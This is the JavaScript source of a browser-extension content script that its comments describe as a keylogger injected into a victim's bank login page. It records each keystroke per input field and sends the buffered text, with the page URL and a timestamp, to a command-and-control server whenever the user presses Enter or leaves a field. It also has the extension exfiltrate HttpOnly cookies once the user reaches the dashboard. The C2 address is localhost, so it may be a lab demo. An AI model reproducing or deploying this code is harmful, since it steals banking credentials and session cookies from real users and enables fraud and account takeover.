/*
 * content script – keylogger
 * injected into the victim page (bank login).
 * buffers keystrokes per input field and exfiltrates them to the C&C server
 * only on meaningful events (blur / Enter), to reduce noisy traffic.
 */

const C2_URL = 'http://localhost:4000';

// per-target buffer: { targetId: "typed characters..." }
const keyBuffers = {};

function getTarget(el) {
  if (!el || !el.tagName) return '';
  const id = el.id || ''; 
  const name = (el.name || '').toString();
  const type = (el.type || '').toString();
  const role = (el.getAttribute && el.getAttribute('aria-label')) || '';
  return id || name || type || role || el.tagName.toLowerCase();
}

function bufferKey(targetId, key) {
  if (!targetId || typeof key !== 'string') return;
  if (!keyBuffers[targetId]) keyBuffers[targetId] = '';
  keyBuffers[targetId] += key;
}

function flushBuffer(targetId) {
  if (!targetId) return;
  const buf = keyBuffers[targetId];
  if (!buf) return;
  delete keyBuffers[targetId];

  fetch(`${C2_URL}/log-keys`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      keys: buf,
      url: window.location.href,
      target: targetId,
      timestamp: new Date().toISOString(),
    }),
  }).catch(() => {});
}

// keydown: buffer characters, flush on Enter
document.addEventListener('keydown', (e) => {
  const target = e.target;
  const targetId = target ? getTarget(target) : '';
  if (!targetId) return;

  bufferKey(targetId, e.key);

  if (e.key === 'Enter') {
    flushBuffer(targetId);
  }
});

// blur: when leaving an input, flush the buffer
document.addEventListener(
  'blur',
  (e) => {
    const targetId = getTarget(e.target);
    flushBuffer(targetId);
  },
  true
);

// user reaches the dashboard >> background exfiltrates HttpOnly cookies
if (window.location.pathname === '/dashboard' || window.location.pathname.endsWith('/dashboard')) {
  chrome.runtime.sendMessage({ action: 'exfiltrateCookies', url: window.location.origin });
}
